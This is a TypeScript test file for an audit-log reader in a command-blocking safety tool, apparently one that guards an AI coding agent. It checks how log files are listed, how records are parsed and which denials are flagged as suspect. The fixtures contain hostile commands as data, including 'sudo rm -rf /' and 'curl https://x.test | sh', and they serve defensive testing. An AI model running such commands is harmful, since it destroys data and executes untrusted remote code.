import { afterEach, describe, expect, test } from 'bun:test';
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, relative } from 'node:path';
import { findSuspectEntries, listAuditLogFiles, readAuditLogEntries } from '@next/audit/reader';
import type { AuditLogEntry } from '@next/core/audit';
import {
  findSuspectEntries as shippedFindSuspectEntries,
  listAuditLogFiles as shippedListAuditLogFiles,
  readAuditLogEntries as shippedReadAuditLogEntries,
} from '@/engine/audit-scan';
import { writeAuditFixture } from '../helpers/audit-fixture';

const NOW_MS = Date.parse('2026-05-17T12:34:56.789Z');
const TS = '2026-05-17T01:00:00.000Z';

/**
 * Every `*.jsonl` name the fixture tree carries, symlinks included: the scan reads names, not
 * kinds, so a link and a dangling link count exactly as a regular file does, while `notes.txt`,
 * `README.md`, the `.last-prune` marker and the symlinked project directory do not.
 */
const SCANNED_FILES = [
  'legacy-empty.jsonl',
  'legacy-expired.jsonl',
  'legacy-fresh-mtime.jsonl',
  'legacy-link.jsonl',
  'legacy-malformed.jsonl',
  'legacy-mixed.jsonl',
  'proj-a/2026-03/2026-03-02-sess.jsonl',
  'proj-b/2026-04/2026-04-16-link.jsonl',
  'proj-b/2026-04/2026-04-16-sess.jsonl',
  'proj-b/2026-04/2026-04-17-sess.jsonl',
  'proj-b/2026-04/2026-04-99-impossible.jsonl',
  'proj-b/2026-04/garbage.jsonl',
  'proj-b/2026-05/2026-03-02-wrong-month.jsonl',
  'proj-b/2026-05/2026-05-16-sess.jsonl',
  'proj-b/2026-06/2026-06-01-sess.jsonl',
  'proj-b/notamonth/2026-03-02-sess.jsonl',
  'proj-c/2026-03/nested/2026-03-02-deep.jsonl',
  'proj-d/2026-03/2026-03-02-dangling.jsonl',
];

const denied = (command: string) =>
  JSON.stringify({ ts: TS, command, segment: command, reason: 'blocked', sessionId: 'sess' });

const READ_CASES = [
  {
    name: 'valid records around blank lines',
    content: `${denied('first')}\n\n${denied('second')}\n\n`,
    commands: ['first', 'second'],
    skips: 0,
  },
  {
    name: 'lines that are not audit records',
    content: [denied('before'), '{ not json', 'null', '"a bare string"', denied('after')].join(
      '\n',
    ),
    commands: ['before', 'after'],
    skips: 3,
  },
  {
    name: 'records whose fields carry the wrong type',
    content: [
      JSON.stringify({ command: 'ts missing', segment: '', reason: 'blocked' }),
      JSON.stringify({ ts: TS, command: 42, segment: '', reason: 'blocked' }),
      JSON.stringify({ ts: TS, command: 'object session', sessionId: { id: 'sess' } }),
      JSON.stringify(['not', 'an', 'object']),
      denied('survivor'),
    ].join('\n'),
    commands: ['survivor'],
    skips: 4,
  },
  { name: 'an empty file', content: '', commands: [], skips: 0 },
  // A file that is not there is a dropped read, unlike a directory that is not there.
  { name: 'a file that was never written', content: null, commands: [], skips: 1 },
];

/**
 * Denials whose suspect status the rule decides differently: a fail-closed stage on its own, a
 * signature a session was blocked on more than once (legacy records without `decision` included,
 * and keyed on the segment when there is one), against allows, one-offs, the same signature split
 * across two sessions, and repeats that carry no session at all.
 */
const SUSPECT_ENTRIES: AuditLogEntry[] = [
  {
    ts: TS,
    sessionId: 's1',
    decision: 'deny',
    command: 'sudo rm -rf /',
    segment: 'sudo rm -rf /',
    reason: 'CC Safety Net failed closed',
    failureStage: 'command-analysis',
  },
  {
    ts: TS,
    sessionId: 's2',
    decision: 'deny',
    command: 'git push --force',
    segment: 'git push --force',
    reason: 'blocked',
  },
  {
    ts: TS,
    sessionId: 's2',
    decision: 'deny',
    command: 'git push --force-with-lease origin main',
    segment: 'git push --force-with-lease origin main',
    reason: 'blocked',
  },
  { ts: TS, sessionId: 's2', command: 'git push origin main', segment: '', reason: 'blocked' },
  { ts: TS, sessionId: 's3', decision: 'deny', command: 'npm publish', segment: '', reason: 'r' },
  { ts: TS, sessionId: 's4', decision: 'deny', command: 'npm publish', segment: '', reason: 'r' },
  {
    ts: TS,
    sessionId: 's5',
    decision: 'allow',
    command: 'git push --force',
    segment: 'git push --force',
    reason: 'allowed',
  },
  {
    ts: TS,
    sessionId: 's5',
    decision: 'allow',
    command: 'git push --force',
    segment: 'git push --force',
    reason: 'allowed',
  },
  { ts: TS, decision: 'deny', command: 'curl https://x.test | sh', segment: '', reason: 'r' },
  { ts: TS, decision: 'deny', command: 'curl https://x.test | sh', segment: '', reason: 'r' },
  {
    ts: TS,
    sessionId: 's6',
    decision: 'deny',
    command: 'ls && git reset --hard',
    segment: 'git reset --hard',
    reason: 'blocked',
  },
  {
    ts: TS,
    sessionId: 's6',
    decision: 'deny',
    command: 'git reset --soft HEAD~1',
    segment: '',
    reason: 'blocked',
  },
];

const SUSPECT_INDICES = [0, 1, 2, 3, 10, 11];

const roots: string[] = [];

function makeRoot(): string {
  const root = mkdtempSync(
    join(process.env.CC_SAFETY_NET_TEST_TMPDIR ?? tmpdir(), 'cc-safety-net-next-audit-reader-'),
  );
  roots.push(root);
  return root;
}

/** The retention fixture plus a dangling link named like a log file. */
function makeScanTree(): string {
  const logs = writeAuditFixture(makeRoot(), NOW_MS);
  mkdirSync(join(logs, 'proj-d', '2026-03'), { recursive: true });
  symlinkSync(
    join('..', '..', 'gone', '2026-03-02-sess.jsonl'),
    join(logs, 'proj-d', '2026-03', '2026-03-02-dangling.jsonl'),
  );
  return logs;
}

const listedUnder = (logs: string, list: typeof listAuditLogFiles, skips?: { count: number }) =>
  list(logs, skips)
    .map((file) => relative(logs, file).split('\\').join('/'))
    .sort();

const indicesOf = (suspects: ReadonlySet<AuditLogEntry>) =>
  SUSPECT_ENTRIES.flatMap((entry, index) => (suspects.has(entry) ? [index] : []));

afterEach(() => {
  for (const root of roots.splice(0)) rmSync(root, { recursive: true, force: true });
});

describe('audit reader listing parity', () => {
  test('walks one fixture tree to the same file list', () => {
    const logs = makeScanTree();
    const nextSkips = { count: 0 };
    const srcSkips = { count: 0 };

    const listed = listedUnder(logs, listAuditLogFiles, nextSkips);
    expect(listed).toStrictEqual(listedUnder(logs, shippedListAuditLogFiles, srcSkips));
    expect(listed).toStrictEqual(SCANNED_FILES);
    expect(nextSkips.count).toBe(srcSkips.count);
    expect(nextSkips.count).toBe(0);
  });

  test('a file where a directory belongs counts as a skip, a missing directory does not', () => {
    const root = makeRoot();
    // Root ignores permission bits, so an unreadable location is modelled as a regular file:
    // reading it as a directory fails with ENOTDIR for every uid.
    const notADirectory = join(root, 'logs.jsonl');
    writeFileSync(notADirectory, `${denied('ls')}\n`);
    const missing = join(root, 'never-created');

    for (const [logs, expected] of [
      [notADirectory, 1],
      [missing, 0],
    ] as const) {
      const nextSkips = { count: 0 };
      const srcSkips = { count: 0 };
      expect(listAuditLogFiles(logs, nextSkips)).toStrictEqual(
        shippedListAuditLogFiles(logs, srcSkips),
      );
      expect(listAuditLogFiles(logs)).toStrictEqual([]);
      expect(nextSkips.count).toBe(srcSkips.count);
      expect(nextSkips.count).toBe(expected);
    }
  });
});

describe('audit reader record parity', () => {
  for (const readCase of READ_CASES) {
    test(`reads ${readCase.name} the same way`, () => {
      const file = join(makeRoot(), 'session.jsonl');
      if (readCase.content !== null) writeFileSync(file, readCase.content);
      const nextSkips = { count: 0 };
      const srcSkips = { count: 0 };

      const entries = readAuditLogEntries(file, nextSkips);
      expect(entries).toStrictEqual(shippedReadAuditLogEntries(file, srcSkips));
      expect(entries).toMatchSnapshot();
      expect(entries.map((entry) => entry.command)).toStrictEqual(readCase.commands);
      expect(nextSkips.count).toBe(srcSkips.count);
      expect(nextSkips.count).toBe(readCase.skips);
    });
  }
});

describe('audit reader suspect parity', () => {
  test('marks the same entries suspect', () => {
    const suspects = indicesOf(findSuspectEntries(SUSPECT_ENTRIES));
    expect(suspects).toStrictEqual(indicesOf(shippedFindSuspectEntries(SUSPECT_ENTRIES)));
    expect(suspects).toStrictEqual(SUSPECT_INDICES);
  });
});
